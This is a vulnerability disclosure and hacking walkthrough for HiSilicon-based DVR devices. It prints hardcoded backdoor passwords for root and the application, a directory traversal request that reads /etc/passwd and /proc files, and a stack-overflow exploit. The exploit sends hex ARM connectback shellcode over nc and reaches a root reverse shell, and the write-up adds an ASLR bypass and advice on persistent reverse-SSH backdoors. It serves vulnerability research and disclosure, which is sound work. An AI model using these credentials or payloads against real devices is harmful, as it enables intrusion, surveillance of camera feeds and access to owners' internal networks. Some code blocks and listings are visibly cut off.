[abstract]
This report discloses serious vulnerabilities (with proof of concept
(PoC) code) of DVR/NVR devices built using the HiSilicon hi3520d and
similar system on a chip (SoC). Exploiting the vulnerabilities lead to
unauthorized remote code execution (RCE) using only the web interface,
causing full takeover of the exploited device. Due to lack of upgraded
firmwares, using these devices is not recommended.
Contacted the vendor before Dec 2016, but still no
response. The release date of the disclosure is Feb 2017.


== preface

Couple of years ago I have bought a cheap Chinese DVR device on eBay.
The boot logo of the device says: "SECULINK - Security Monitoring". As
an IT security enthusiast, I decided to have a closer look of the device
to see how "secure" that security monitoring service is. Googling about
the topic I have found some interesting materials, but digged deeper,
and found much more interesting and much more serious issues (0-days)
about the device.

Let us have a look at the full hacking session from the beginning. (The
new, own achievements will be noted as the old, known ones as well.)


== exploring the DVR

First we should learn the official user interface, then dig deeper,
maybe try to obtain the firmware. The chances to find vulnerabilities
increase with the firmware.


=== the DVR at a first glance

The DVR device intented for testing is branded as "Seculink".

image::./seculink_device.png[Seculink DVR device]

Available physical interfaces:

* 2x USB ports (officially for mouse to control the GUI console),
* HDMI port (and VGA) for attaching external monitor (for GUI & camera
views),
* 4x BNC connectors for analogoue CCTV cameras,
* SATA port inside for attaching storage for recording the video stream,
* Ethernet port for network access.

Official user interfaces:

* direct access using the HDMI (or VGA) as output and USB mouse /
keyboard for input for camera view / control / full setup,
* network access through HTTP for camera view / control.

The directly accessible setup interface is restricted by user
authentication (username, password). Default superuser is 'admin',
default password is blank.

After setting up a strong password, the user may feel safe that his/her
camera view is not accessible by others. People often forward the web
port (tcp/80) of the DVR device to the WAN side from their secure LAN in
order to access the DVR streams from outside (we may check this e.g. by
a suitable Shodan search ;) ).


=== obtaining the firmware

There may be lot of ways for getting the firmware:

* get it from the device by some soft method (using the official
interface, or exploiting some vulnerability),
* get it from the device by some hard method (JTAG, serial console,
etc.),
* find and download it from the internet (if it is available).

Although the latter (download) method is working here and it is the
easiest, let us try the first one, because it gives other information
about the device, too.

=== service scanning

Let us do a full port scan on the DVR. Note, that the (default if run by
root) SYN scan is very slow because dropped packets, but the full TCP
connect scan finishes in a couple of minutes.

----

Summarizing and manual testing:

* 23/tcp is a telnet login interface protected by some username
+ password (not the application credentials)
* 80/tcp is the web interface protected by the application credentials
* 554/tcp is an rtsp service; it can be opened by a common rtsp url:
+
----
rtsp://192.168.88.127:554/user=admin&password=&channel=1&stream=0.sdp
----
+

Note, that opening the rtsp stream requires credentials as well.
* 9527/tcp seems to be a (secret?) service port with some very
interesting features,
* 34567/tcp and 34599/tcp seem to be some data ports related to the DVR
application.

Here we should state that the device is probably some Linux-like
system.

Connecting to 9527/tcp (by raw netcat) shows the application console
with logging messages and a login prompt. Logging in with any of the
defined application credentials is working. Issuing `help` after the
prompt gives a short description of the console commands. The command
`shell` seems to be the most interesting. Yes, it gives a root shell to
the devices. ;)

Note, that this is obviously a serious security issue, because any (low
privileged) application user should not get a root shell on the device
automatically.

=== root shell

Exploring the device in the root shell (e.g. by `dmesg`) makes it
obvious that the DVR is running a Linux kernel (version 3.0.8), it has
an ARMv7 CPU, the SoC model is `hi3520d`.

From the list of running processes (`ps`) it is clear that the DVR
application is `/var/Sofia`, which is listening on 34568/udp and
34569/udp as well besides the above tcp ports detected by nmap
(`netstat -nlup`).

From the list of mounted disks (`mount` command), it is clear that the
firmware image is in the `/dev/mtdblockX` devices (where X=0,1,2,3,4,5).

The firmware is small and therefore restricted, so we should be creative
if we want to copy files to/from the device. Fortunately NFS is
supported, so setting up an NFS server on our desktop machine and
mounting it from the DVR solves the problem:

----
mount -t nfs 192.168.88.100:/nfs /home -o nolock
----

Now obtaining the firmware is straightforward:

----
cat /dev/mtdblock1 > /home/mtdblock1-root.img
cat /dev/mtdblock2 > /home/mtdblock2-usr.img
cat /dev/mtdblock3 > /home/mtdblock3-custom.img
cat /dev/mtdblock4 > /home/mtdblock4-logo.img
cat /dev/mtdblock5 > /home/mtdblock5-mtd.img
----

We may get the files (not just the raw images):

----
cp /var/Sofia /home/
tar -cf /home/fs.tar /bin /boot /etc /lib /linuxrc /mnt /opt /root /sbin /share /slv /usr /var
----

=== telnet interface

For accessing the device through the telnet interface (port 23/tcp), we
may need some OS credentials. Looking at `/etc/passwd` we have the
password hash for the root user:

----
root:absxcfbgXtb3o:0:0:root:/:/bin/sh
----

Note, that there is no other user than root, everything is running with
full privileges. (So if someone breaks into the device somehow, there is
no barrier, the attacker gains full power immediately.)

Assuming a six-char alphanum (lowercase) password, hashcat cracks the
above weak DES hash quickly:

----
$ ./hashcat64.bin -a3 -m1500 absxcfbgXtb3o -1 ?l?d ?1?1?1?1?1?1

absxcfbgXtb3o:xc3511

----

So with user `root` and password `xc3511` logging in throught the telnet
interface on port 23/tcp is possible. This hard-coded root account
accessible on the unclosable telnet interface is obviously a backdoor.

These results were almost available by others before our research, but
the following is completely new.

== firmware reversing

Exploring the firmware it turns out that the binary `/var/Sofia` is the
main application which implements every interface besides video
processing and others. So this binary seems to be the most interesting
for us.

Unfortunately it is (statically linked and) stripped which makes static
analysis harder:

----
$ file Sofia 
Sofia: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), statically linked, stripped, with debug_info
----

So besides static analyis (with radare2 or IDA) dynamic analysis should
be very helpful.

=== remote gdb

For dynamic analysis, attaching GNU Project debugger (GDB) to the remote
`/var/Sofia` application should be advantageous. The recommended method
is to run (and attach) `gdbserver` on the remote device, and connect
`gdb` to it from the local machine.

Of course we need a `gdbserver` compiled (preferably statically) for the
appropriate ARM architecture. In order to build it, we may use
https://www.uclibc.org/[ÂµClibc] which is the recommended C library for
embedded systems (like our DVR). Available builds are dynamic builds
which are problematic on our DVR, so we should make custom static builds
ourselves. There is a nice build environment called
https://buildroot.org/[Buildroot] which makes building work
out-of-the-box (select the required apps (e.g. gdb) with
`make menuconfig`, do not forget to choose static libraries, then run
`make`).

After a short build time (~10-15 mins) all the necessary tools should be
available. The static binaries can be transferred to the device by the
previously mentioned NFS method. Note, that the directory `/var`
containing the Sofia binary is a ramfs, so it is not persistent across
reboots. If we want to transfer the binaries (almost) permanently, the
rw partition `/mnt/mtd` containing the configuration files should be a
suitable target. If you build the package `openssh` too, `scp` will be
available which makes transferring files more easier.

Now the firmware is ready for some reversing. Attaching `gdbserver`
remotely is working now (getting the PID of the Sofia process is easy by
`ps`):

----
$ /mnt/mtd/gdbserver --attach :2000 610
----

Connecting from the local machine:

----
$ gdb -ex 'set gnutarget elf32-littlearm' -ex 'target remote 192.168.88.127:2000'
----

Note, that using some GDB extension (like
http://gef.readthedocs.io/en/master/[GEF]) is recommended. If pausing
the application does not work (with C-c) for some reason, sending a TRAP
signal to the Sofia process (by `kill -TRAP 610`) should pause it.


=== inspect the authentication procedure

The recommended tool for static analysis is obviously Hex-Ray's
https://www.hex-rays.com/products/ida/[IDA Pro]. Unfortunately it is not
cheap, but much better than any other tools.

There are 15.000+ functions after initial auto analysis, but finding the
auth function is just a moment with IDA (using simple Python scripting).
The
https://www.hex-rays.com/products/ida/support/idapython_docs/[IDAPython]
snippet below searches for all functions that references to anything
related to "Users" _and_ "Password" (at the same time):

[source,python]
----
x1, x2 = set(), set()
for loc, name in Names():
  if "Users" in name:
    for addr in XrefsTo(loc):
      x1.add(GetFunctionName(addr.frm))
  elif "Password" in name:
    for addr in XrefsTo(loc):
      x2.add(GetFunctionName(addr.frm))
print x1 & x2
----

The result is only one function: `sub_2D857C`. Quick analysis of this
function confirms that this should be the authentication function.

There is an initial check on the cleartext password against a hardcoded
string (before getting the password hash of the user from the config).
If it passes, authentication is granted. This is an ugly backdoor in the
application. The universal password is: `I0TO5Wv9`.

With this password we can access anything in the application as any user
(e.g. admin). For example, getting the video stream:

----
$ cvlc 'rtsp://192.168.88.127:554/user=admin&password=I0TO5Wv9&channel=1&stream=0.sdp'
----

Or getting a root shell on the application console (9527/tcp) is also
working:

----
$ nc 192.168.88.127 9527
nc: using stream socket
   
username:admin
password:I0TO5Wv9
login(admin, ******, Console, address:)
admin$
----

One more interesting result in the authentication algorithm:
in some circumstances the auth function accepts not just the
password but the hash also. Opening the rtsp video stream is
possible by not just the password but the hash (which is stored
in /mnt/mtd/Config/Account1). For example, `tlJwpbo6` is the
hash of the empty password (see next section too), so
```
cvlc 'rtsp://192.168.88.127:554/user=admin&password=&channel=1&stream=0.sdp'
cvlc 'rtsp://192.168.88.127:554/user=admin&password=tlJwpbo6&channel=1&stream=0.sdp'
```
also works.


=== password hash function

Another result of the auth function (deeper) static analysis: the
password hash function is `sub_3DD5E4`. It is basically MD5 with some
strange transformations. Reversed and implemented it in Python:

[source,python]
----
import hashlib

def sofia_hash(msg):
    h = ""
    m = hashlib.md5()
    m.update(msg)
    msg_md5 = m.digest()
    for i in range(8):
        n = (ord(msg_md5[2*i]) + ord(msg_md5[2*i+1])) % 0x3e
        if n > 9:
            if n > 35:
                n += 61
            else:
                n += 55
        else:
            n += 0x30
        h += chr(n)
    return h
----

With the implemented hash algorithm, brute forcing passwords or setting
arbitrary passwords is possible.


== buffer overflow in builtin webserver

The Sofia binary handles the HTTP requests on port 80/tcp. Let us try
some fuzzing with the requests. Of course, attaching gdb (see above)
should be helpful. Actually, we should kill the Sofia process and
restart it with gdbserver to see the console output as well:

----
$ kill 610
$ /mnt/mtd/gdbserver :2000 /var/Sofia
----

And locally:

----
$ gdb -q -ex 'set gnutarget elf32-littlearm' -ex 'target remote 192.168.88.127:2000'
gef>  c
----

Now let us see the GET requests. No response:

----
$ echo 'GET /' | nc 192.168.88.127 80
----

Normal response (even without proper closing and/or newline at the end):

----
$ echo -ne 'GET / HTTP' | nc 192.168.88.127 80
----

Test for some overflow with a looong request:

----
$ python -c 'print "GET " + "a"*1000 + " HTTP"' |  nc 192.168.88.127 80
----

Nice. The response is a 200 with a "404 File Not Found" message, but we
can see a wonderful crash in the gdb. ;)

Note, that there is a watchdog kernel module enabled for the Sofia
application. If it is not running for a minute, the device reboots. This
is good on the one hand if we experiment with a remote device, but it is
bad on the other if we want to do some debugging smoothly.

The watchdog can not be turned off once it has been started, so the only
way to get rid of it is to modify the read-only firmware by reflashing.
It is not recommended unless we want to brick our test device. ;)


=== program flow control

Why is the crash wonderful (in an attacker's view)? The remote process
Sofia got SIGSEGV (segmentation fault), the stack is filled up with our
"a" characters, but the most important is: the $pc (program counter)
register has our injected value `0x61616160` ("aaaa" - 1) in it
(probably triggered by a ret but the cause is not important). This
should be a classical stack overflow, and this means that we have the
chance to control the program flow easily.

After some experimenting (by interval halving):

----
$ python -c 'print "GET " + "0123" + "a"*(299-4) + "wxyz" + " HTTP"' |  nc 192.168.88.127 80
----

This results SIGSEGV, too, and the $pc register is `0x7a797876`
(~"wxyz"; reversed, because byte-ordering is little-endian; and -1
because alignment). Our payload starts (with "0123aaa...") at $sp+0x14
(stack base + 0x14).


=== remote code execution

Exploiting such an overflow most easily and effectively is by injecting
some shellcode into the stack and redirect the program flow there. This
way we get arbitrary remote code execution on the target. Because there
is no privilege separation on the device OS, this means full control
(root shell access).

However, there may be (modern) exploit mitigation techniques enabled
which could make an attacker's life much harder.

The most basic way protecting against shellcodes on stack is the
No-eXecute (NX) bit technology. This can prevent executing code on
selected memory pages (usually pages with write permission like stack).
Fortunately (from the view of the attacker ;) ), there is no NX bit set
(look at STACK flags, rwx):

----
$ objdump -b elf32-littlearm -p Sofia

Sofia:     file format elf32-littlearm

Program Header:
0x70000001 off    0x00523f34 vaddr 0x0052bf34 paddr 0x0052bf34 align 2**2

private flags = 5000002: [Version5 EABI]<Unrecognised flag bits set>
----

or just use `checksec` in gdb gef. `checksec` in gdb gef also tells us
that there is no other mitigations present such as stack canary (which
is obvious, because we could not control $pc with stack overflow if
there would be stack canary present).

The only thing we should know before getting the RCE work is the stack
address. We should inject address $sp+0x14 in the appropriate position
of our payload ("wxyz" above) in order to redirect program flow to the
shellcode.

There is also a mitigation technique which could make this harder (or
very hard, almost impossible in some cases): address space layout
randomization (ASLR). ASLR randomizes the base addresses of the memory
segments (e.g. the base address of the stack).

Out of luck, ASLR is enabled ("2" means full randomization, "0" is
disabled):

----
$ cat /proc/sys/kernel/randomize_va_space 
2
----


==== RCE without ASLR

Let us try to exploit the overflow first with ASLR turned off.

----
$ echo 0 > /proc/sys/kernel/randomize_va_space 
----

Following the above procedure, we get that the stack address ($sp) is
0x5a26f3d8 at the time of the SIGSEGV crash (and it is the same in
different runs with ASLR turned off).

So the payload should be:

----
python -c 'print "GET " + shellcode + "a"*(299-len(shellcode)) + "\xd8\xf3\x26\x5a" + " HTTP"' | nc 192.168.88.127 80
----

where the shellcode should be something we want to execute, preferably a
connectback shellcode. Note, that there are "badchars", which must be
avoided: 0x00, 0x0d ('\n'), 0x20 (' '), 0x26 ('&'), 0x3f ('?').
Moreover, there is a 299 byte size limit. Shellcode generators can not
deal with our badchar list, even using automated encoders can not solve
the problem (because of the size limit).

So a custom shellcode should be generated. The shellcode here gives a
connectback shell using socket, connect, dup2 and execve system calls
(or supervisor calls according to the terminology of the ARM world). We
have to be strict and creative in order to avoid badchars. Labels should
not be used, those are just for easier readability.

Compiling the shellcode and getting the raw binary bytes (using any
cross-tool for ARM should work, e.g. the ones built using buildroot in
`buildroot-2017.02.5/output/host/usr/bin/` is good, too):

Injecting this with the payload should make the exploit work, and it
should give a connectback shell to the remote device.

Of course, first start a listener on `192.168.88.100`:

----
$ nc -nvlp 31337
----

Then start up the payload:

----
$ python -c 'shellcode = "01108fe211ff2fe111a18a78013a8a700221081c0121921a0f02193701df061c0ba102230b801022023701df3e270137c821301c01df0139fbd507a0921ac27105b469460b2701df0127381c01dfc046ffff7b69c0a858642f62696e2f736858deadbeef".decode("hex");  print "GET " + shellcode + "a"*(299-len(shellcode)) + "\xec\xf3\x26\x5a" + " HTTP"' | nc 192.168.88.127 80

Exploit should work! :) In the local gdb:

----
process 1064 is executing new program: /bin/busybox
Reading /bin/busybox from remote target...
Reading /bin/busybox from remote target...
----

And the RCE is ready on the netcat listener:

----
nc: connect to 192.168.88.100 31337 from 192.168.88.127 55442
nc: using stream socket
----

Now executing arbitraty commands (as root!) on the remote system is
possible.

But unfortunately the exploit is not ready for real world deployment,
beacuse ASLR is turned on and thus we do not know the shellcode start
address. Yet.


==== defeating ASLR

Defeating ASLR is not an easy job, but it can be done often with some
creativity. Usually there are two ways to do it:

* finding some weakness in the randomizer and attack it by brute force
or some partial leak / partial overwrite,
* leak the randomized memory addresses of the remote binary.

Now brute forcing seems to be useless (triggering a bad address causes
crash and slow reboot), so only the leak seems to be convenient (if we
find any).

After a long research it almost had to be given up, could not find any
leak, but then an idea came up from a totally different direction.

There is a different vulnerability in the webserver, a classical
directory traversal vulnerability. In fact, it also works for listing
directories (this will be important also).

The directory traversal vulnerability means:

----
$ echo -ne 'GET ../../etc/passwd HTTP' | nc 192.168.88.127 80
nc: using stream socket
HTTP/1.0 200 OK
Content-type: text/plain
Server: uc-httpd 1.0.0
Expires: 0

root:absxcfbgXtb3o:0:0:root:/:/bin/sh
----

and we can get dir listing also:

----
$ echo -ne 'GET ../../etc HTTP' | nc 192.168.88.127 80nc: using stream socket
HTTP/1.0 200 OK
Content-type: application/binary

----

Note, that this vulnerability is serious, because the attacker can read
any files, including recorded videos (if the device has some HDD
storage).

Furthermore, the vulnerability can help us to defeat ASLR.

The `/proc` filesystem contains a lot of information about running
processes in the `/proc/[pid]` directories. Listing `/proc` is possible
using `GET ../../proc`, this way we can get all of the PIDs. If the
`/proc/[pid]/cmdline` is `/var/Sofia`, the PID of the application is
found.

The most important information for defeating ASLR is in
`/proc/[pid]/smaps`. This file contains memory page statistics, contains
page addresses and other interesting information (e.g. rss). For
example:

----
$ echo -ne 'GET ../../proc/610/cmdline HTTP' | nc 192.168.88.127 80
nc: using stream socket

This is only one page, the listing contains about ~150 pages.

Looking at the above structure (making attention to the page sizes,
patterns, etc.), we can guess (by experiment and heuristics) which one
contains the stack of the required thread. The offset of the stack from
the base address is constant (it is 0x7fd3d8).

The snippet guessing the memory page:

[source,python]
----
def guessregion(smaps):
    for t in range(len(smaps)-7, 1, -1):
        if (smaps[t][1][0], smaps[t+1][1][0], smaps[t+2][1][0], smaps[t+3][1][0], smaps[t+4][1][0], smaps[t+5][1][0], smaps[t+6][1][0]) == (8188, 8188, 8188, 8188, 8188, 8188, 8188) and
        smaps[t][1][1] == 4 and smaps[t+1][1][1] == 4 and smaps[t+2][1][1] == 4 and smaps[t+3][1][1] >= 8 and smaps[t+4][1][1] >= 4 and smaps[t+5][1][1] >= 4 and smaps[t+6][1][1] >= 8:
            return (t+3)
    return (-1)
----

where `smaps[t][1][0]` is the size of the `t`-th full page,
`smaps[t][1][1]` is the related RSS.

The snippet is part of the full exploit script which is working
automatically against various ASLR enabled HiSilicon targets. For a
brief intro about the script:

----
$ ./pwn_hisilicon_dvr.py -h

=== post-exploitation

What can we do with this RCE? Everything. Remember, that this is an
unauthorized RCE which only uses the web service port 80/tcp. This port
is commonly forwarded to outside, so if an attacker exploits this RCE,
he/she gets access to the internal LAN.

Our exploit script has some nice features, such as it can upload
(previously compiled) tools to the victim device.

If we want to make a persistant, stable backdoor, we may upload a
Dropbear, make it listen locally, and open a reverse SSH tunnel to
outside. With this architecture, it will be possible to login to the DVR
device from anywhere, anytime.

If someone thinks that only this "Seculink" branded device is affected
by these serious vulnerabilities, it is wrong. The range of the affected
devices is very large. Every device is vulnerable built with these kind
of HiSilicon SoC hardware. These devices share (almost) the same
firmware with this binary application called "Sofia". The above
vulnerability (even the full-featured script) works almost reliably
without modification on a lot of different hardwares.

Here is a (not complete) list of brands affected:

In general, it can be said that these kind of cheap IoT devices are
security nightmares. Every device tested recently by the author had some
serious or critical vulnerability. From a pentester's point of view the
recommendation is that these kind of devices must be separated well,
these kind of devices must not share the same network with important,
confidential data. Unfortunately there is no real chance to get updates
with patches for such firmwares.

Finally, it is important to tell that this buffer overflow vulnerability
(with the exploit PoC code) had been disclosed through the
https://www.beyondsecurity.com/ssd.html[SecuriTeam Secure Disclosure]
(SSD) program of https://www.beyondsecurity.com/[Beyond Security]. The
vendor (HiSilicon) had been notified (by Beyond Security) at the end of
2016, but there was no reply before the vulnerability had been released
to public (it is a common thing, unfortunately).

The released disclosure from Feb 2017 is available
https://ssd-disclosure.com/ssd-advisory-hisilicon-multiple-vulnerabilities/[here].
